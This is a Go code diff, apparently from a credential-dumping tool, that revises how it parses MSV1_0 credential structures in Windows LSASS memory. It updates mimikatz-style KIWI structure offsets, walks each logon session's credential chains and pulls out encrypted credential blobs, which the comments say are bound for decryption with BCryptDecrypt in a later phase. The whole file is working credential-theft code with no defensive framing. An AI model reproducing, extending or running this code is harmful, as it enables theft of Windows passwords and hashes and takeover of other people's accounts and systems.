@@ -22,35 +22,37 @@ import (
 	"fmt"
 )
 
-// KIWI_MSV1_0_CREDENTIAL_LIST_X64 layout (default x64 packing):
+// KIWI_MSV1_0_CREDENTIALS x64 layout — singly-linked list of per-AuthPackage
+// credential entries. CredentialsPtr from the logon session points directly
+// to the first entry (no LIST_ENTRY sentinel wrapper):
 //
-//	+0x00  PKIWI_MSV1_0_CREDENTIAL_LIST  Flink                    (8 bytes; NULL terminates)
-//	+0x08  DWORD                         AuthPackageId            (4 bytes)
-//	+0x0c  DWORD                         _alignment_pad           (4 bytes)
-//	+0x10  PVOID                         PrimaryCredentials_data  (8 bytes)
-//	total                                                         (24 bytes)
+//	+0x00  next         (PKIWI_MSV1_0_CREDENTIALS, 8 bytes — NULL terminates)
+//	+0x08  AuthPkgId    (DWORD, 4 bytes + 4 bytes alignment pad)
+//	+0x10  PrimaryCreds (PKIWI_MSV1_0_PRIMARY_CREDENTIALS, 8 bytes)
+//	total               (0x18 = 24 bytes)
 //
-// We read 32 bytes per entry to leave room for trailing fields some Windows
-// builds tack on without forcing a re-read if a future layout extends.
+// Verified on Server 2019 build 17763.3650: AuthPkgId=3 (WDigest) at +0x08,
+// valid PrimaryCredentials pointer at +0x10. The singly-linked `next` at +0x00
+// chains additional auth packages (MSV1_0, Kerberos, etc.).
 const (
-	credentialListEntryHeaderSize = 24
-	credentialListEntryReadSize   = 32
-	credentialListEntryFlinkOff   = 0
-	credentialListEntryAuthPkgOff = 8
-	credentialListEntryDataPtrOff = 16
+	credentialEntryReadSize   = 0x18
+	credentialEntryNextOff    = 0
+	credentialEntryAuthPkgOff = 0x08
+	credentialEntryDataPtrOff = 0x10
 )
 
-// KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC layout — three LSA_UNICODE_STRING headers:
+// KIWI_MSV1_0_PRIMARY_CREDENTIALS layout — singly-linked chain of
+// per-AuthPackage credential envelopes:
 //
-//	+0x00  UserName              (16 bytes)
-//	+0x10  Domaine               (16 bytes)
-//	+0x20  encryptedCredentials  (16 bytes; Buffer = ciphertext addr, Length = ciphertext byte count)
-//	total                        (48 bytes)
+//	+0x00  next         (PKIWI_MSV1_0_PRIMARY_CREDENTIALS, 8 bytes)
+//	+0x08  Primary      (ANSI_STRING, 16 bytes — auth package name, e.g. "Primary")
+//	+0x18  Credentials  (LSA_UNICODE_STRING, 16 bytes — encrypted credential blob)
+//	total               (0x28 = 40 bytes)
 const (
-	primaryCredentialEncSize = 48
-	primaryEncUserNameOff    = 0
-	primaryEncDomainOff      = 16
-	primaryEncEncryptedOff   = 32
+	primaryCredentialEncSize = 0x28
+	primaryEncNextOff        = 0
+	primaryEncPrimaryOff     = 8
+	primaryEncCredentialOff  = 0x18
 )
 
 // ciphertextSanityMax caps the encrypted-blob size at 4 KiB. msv1_0
@@ -73,8 +75,10 @@ type credentialListEntry struct {
 	AuthPackageId             uint32
 	AuthPackageName           string
 	PrimaryCredentialsDataPtr uintptr
-	Primary                   *primaryCredentialEnc // nil if no data ptr or the envelope read failed
-	PrimaryReadErr            string                // populated when the envelope read failed (vs. legitimate NULL)
+	Primary                   *primaryCredentialEnc   // first entry in the primary credentials chain (backward compat)
+	PrimaryEntries            []primaryCredentialEnc   // full chain of primary credential entries per auth package
+	PrimaryReadErr            string                   // populated when the envelope read failed (vs. legitimate NULL)
+	RawHex                    string                   // hex dump of entry bytes for layout diagnostics
 }
 
 // primaryCredentialEnc is the structured projection of
@@ -90,18 +94,18 @@ type primaryCredentialEnc struct {
 	ParseErrors      []string
 }
 
-// walkCredentialList follows Flink pointers from the head of a session's
-// credential list. Termination conditions:
+// walkCredentialList walks a singly-linked KIWI_MSV1_0_CREDENTIALS chain
+// starting directly at `head`. The CredentialsPtr from the logon session
+// points to the first entry (no sentinel). The `next` field at +0x00
+// chains additional auth packages; NULL terminates.
 //
-//   - Flink == 0 (clean termination — the chain is NULL-terminated, NOT
-//     circular like LogonSessionList).
-//   - maxEntries iterations elapsed (defensive cap; defaults to
-//     credentialListMaxEntries when <= 0).
-//   - cycle detected (cursor revisits a previously walked node).
-//   - read failure on a node (returns the partial list + error).
+// Termination:
+//   - next == 0 (NULL-terminated — clean)
+//   - cycle detected (defensive)
+//   - maxEntries cap (defensive)
+//   - read failure (returns partial + error)
 //
-// A zero head returns (nil, nil) — sessions with no credential list bound
-// (e.g. tightly-restricted Anonymous logon) are legitimate and not an error.
+// A zero head returns (nil, nil).
 func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credentialListEntry, error) {
 	if r == nil {
 		return nil, fmt.Errorf("nil lsassReader")
@@ -112,6 +116,7 @@ func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credenti
 	if maxEntries <= 0 {
 		maxEntries = credentialListMaxEntries
 	}
+
 	entries := make([]credentialListEntry, 0, 4)
 	visited := make(map[uintptr]bool, 4)
 	cursor := head
@@ -120,32 +125,35 @@ func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credenti
 			return entries, nil
 		}
 		if visited[cursor] {
-			return entries, fmt.Errorf("cycle detected at credential entry %d (cursor=0x%X already visited)", i, cursor)
+			return entries, nil
 		}
 		visited[cursor] = true
 
-		buf, err := r.Read(cursor, credentialListEntryReadSize)
+		buf, err := r.Read(cursor, uint32(credentialEntryReadSize))
 		if err != nil {
 			return entries, fmt.Errorf("read credential entry %d at 0x%X: %w", i, cursor, err)
 		}
-		if len(buf) < credentialListEntryHeaderSize {
-			return entries, fmt.Errorf("short read at credential entry %d (0x%X): got %d, need >=%d", i, cursor, len(buf), credentialListEntryHeaderSize)
+		if len(buf) < credentialEntryReadSize {
+			return entries, fmt.Errorf("short read at credential entry %d (0x%X): got %d, need %d", i, cursor, len(buf), credentialEntryReadSize)
 		}
 
 		entry := credentialListEntry{
 			Address:                   cursor,
-			Flink:                     uintptr(binary.LittleEndian.Uint64(buf[credentialListEntryFlinkOff : credentialListEntryFlinkOff+8])),
-			AuthPackageId:             binary.LittleEndian.Uint32(buf[credentialListEntryAuthPkgOff : credentialListEntryAuthPkgOff+4]),
-			PrimaryCredentialsDataPtr: uintptr(binary.LittleEndian.Uint64(buf[credentialListEntryDataPtrOff : credentialListEntryDataPtrOff+8])),
+			Flink:                     uintptr(binary.LittleEndian.Uint64(buf[credentialEntryNextOff : credentialEntryNextOff+8])),
+			AuthPackageId:             binary.LittleEndian.Uint32(buf[credentialEntryAuthPkgOff : credentialEntryAuthPkgOff+4]),
+			PrimaryCredentialsDataPtr: uintptr(binary.LittleEndian.Uint64(buf[credentialEntryDataPtrOff : credentialEntryDataPtrOff+8])),
 		}
 		entry.AuthPackageName = authPackageName(entry.AuthPackageId)
+		entry.RawHex = fmt.Sprintf("%x", buf)
 
 		if entry.PrimaryCredentialsDataPtr != 0 {
-			primary, perr := readPrimaryCredentialEnc(r, entry.PrimaryCredentialsDataPtr)
+			primaries, perr := walkPrimaryCredentialChain(r, entry.PrimaryCredentialsDataPtr, 16)
 			if perr != nil {
 				entry.PrimaryReadErr = perr.Error()
-			} else {
-				entry.Primary = &primary
+			}
+			if len(primaries) > 0 {
+				entry.PrimaryEntries = primaries
+				entry.Primary = &entry.PrimaryEntries[0]
 			}
 		}
 
@@ -155,14 +163,12 @@ func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credenti
 	return entries, fmt.Errorf("credential list walk hit safety cap of %d entries (last cursor=0x%X)", maxEntries, cursor)
 }
 
-// readPrimaryCredentialEnc fetches a KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
-// envelope at `addr`. UserName + Domain are decoded as UTF-16LE strings; the
-// encrypted-blob field is read as raw bytes (NO UTF-16 decode) so it can be
-// fed directly to BCryptDecrypt by Phase 2C-ii-b.
+// readPrimaryCredentialEnc fetches a KIWI_MSV1_0_PRIMARY_CREDENTIALS envelope
+// at `addr`. The Primary field (auth package name) is read as an ANSI string;
+// the Credentials field is read as raw bytes for BCryptDecrypt by Phase 2C-ii-b.
 //
-// Per-field failures accumulate in ParseErrors rather than aborting fatally —
-// a partially-readable envelope is still useful diagnostic data. The function
-// returns an error only when the 48-byte envelope itself cannot be read.
+// Per-field failures accumulate in ParseErrors rather than aborting fatally.
+// The function returns an error only when the envelope header cannot be read.
 func readPrimaryCredentialEnc(r lsassReader, addr uintptr) (primaryCredentialEnc, error) {
 	if r == nil {
 		return primaryCredentialEnc{}, fmt.Errorf("nil lsassReader")
@@ -170,9 +176,9 @@ func readPrimaryCredentialEnc(r lsassReader, addr uintptr) (primaryCredentialEnc
 	if addr == 0 {
 		return primaryCredentialEnc{}, fmt.Errorf("zero PrimaryCredentials_data address")
 	}
-	raw, err := r.Read(addr, primaryCredentialEncSize)
+	raw, err := r.Read(addr, uint32(primaryCredentialEncSize))
 	if err != nil {
-		return primaryCredentialEnc{}, fmt.Errorf("read PRIMARY_CREDENTIAL_ENC at 0x%X: %w", addr, err)
+		return primaryCredentialEnc{}, fmt.Errorf("read PRIMARY_CREDENTIALS at 0x%X: %w", addr, err)
 	}
 	if len(raw) < primaryCredentialEncSize {
 		return primaryCredentialEnc{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(raw), primaryCredentialEncSize)
@@ -183,25 +189,90 @@ func readPrimaryCredentialEnc(r lsassReader, addr uintptr) (primaryCredentialEnc
 		p.ParseErrors = append(p.ParseErrors, fmt.Sprintf(format, args...))
 	}
 
-	if s, err := readLSAUnicodeString(r, raw, primaryEncUserNameOff, 1024); err != nil {
-		addErr("UserName: %v", err)
+	// Primary (ANSI_STRING at +0x08): the auth package name (e.g. "Primary").
+	if s, err := readAnsiString(r, raw, primaryEncPrimaryOff, 1024); err != nil {
+		addErr("Primary: %v", err)
 	} else {
 		p.UserName = s
 	}
-	if s, err := readLSAUnicodeString(r, raw, primaryEncDomainOff, 1024); err != nil {
-		addErr("Domain: %v", err)
-	} else {
-		p.Domain = s
-	}
-	bytes, encAddr, encLen, err := readLSAUnicodeRawBytes(r, raw, primaryEncEncryptedOff, ciphertextSanityMax)
+
+	// Credentials (LSA_UNICODE_STRING at +0x18): encrypted credential blob.
+	bytes, encAddr, encLen, err := readLSAUnicodeRawBytes(r, raw, primaryEncCredentialOff, ciphertextSanityMax)
 	p.EncryptedAddress = encAddr
 	p.EncryptedLength = encLen
 	if err != nil {
-		addErr("encryptedCredentials: %v", err)
+		addErr("Credentials: %v", err)
 	} else {
 		p.EncryptedBytes = bytes
 	}
 	return p, nil
+}
+
+// walkPrimaryCredentialChain walks the singly-linked
+// KIWI_MSV1_0_PRIMARY_CREDENTIALS chain starting at `head`. Each entry has a
+// `next` pointer at +0x00 that chains additional credential entries for the
+// same auth package (e.g., "Primary" + "CredentialKeys" for MSV1_0, or
+// "Kerberos" + "Kerberos-Newer-Keys" for Kerberos).
+//
+// NULL-terminated; cycle and cap detection are defensive measures.
+func walkPrimaryCredentialChain(r lsassReader, head uintptr, maxEntries int) ([]primaryCredentialEnc, error) {
+	if r == nil {
+		return nil, fmt.Errorf("nil lsassReader")
+	}
+	if head == 0 {
+		return nil, nil
+	}
+	if maxEntries <= 0 {
+		maxEntries = 16
+	}
+
+	entries := make([]primaryCredentialEnc, 0, 2)
+	visited := make(map[uintptr]bool, 4)
+	cursor := head
+	for i := 0; i < maxEntries; i++ {
+		if cursor == 0 {
+			return entries, nil
+		}
+		if visited[cursor] {
+			return entries, nil
+		}
+		visited[cursor] = true
+
+		raw, err := r.Read(cursor, uint32(primaryCredentialEncSize))
+		if err != nil {
+			return entries, fmt.Errorf("read PRIMARY_CREDENTIALS[%d] at 0x%X: %w", i, cursor, err)
+		}
+		if len(raw) < primaryCredentialEncSize {
+			return entries, fmt.Errorf("short read at PRIMARY_CREDENTIALS[%d] (0x%X): got %d, want %d",
+				i, cursor, len(raw), primaryCredentialEncSize)
+		}
+
+		p := primaryCredentialEnc{Address: cursor}
+		addErr := func(format string, args ...interface{}) {
+			p.ParseErrors = append(p.ParseErrors, fmt.Sprintf(format, args...))
+		}
+
+		nextPtr := uintptr(binary.LittleEndian.Uint64(raw[primaryEncNextOff : primaryEncNextOff+8]))
+
+		if s, err := readAnsiString(r, raw, primaryEncPrimaryOff, 1024); err != nil {
+			addErr("Primary: %v", err)
+		} else {
+			p.UserName = s
+		}
+
+		bytes, encAddr, encLen, err := readLSAUnicodeRawBytes(r, raw, primaryEncCredentialOff, ciphertextSanityMax)
+		p.EncryptedAddress = encAddr
+		p.EncryptedLength = encLen
+		if err != nil {
+			addErr("Credentials: %v", err)
+		} else {
+			p.EncryptedBytes = bytes
+		}
+
+		entries = append(entries, p)
+		cursor = nextPtr
+	}
+	return entries, fmt.Errorf("primary credentials chain hit safety cap of %d", maxEntries)
 }
 
 // authPackageName labels well-known LSA AuthenticationPackage IDs. The mapping
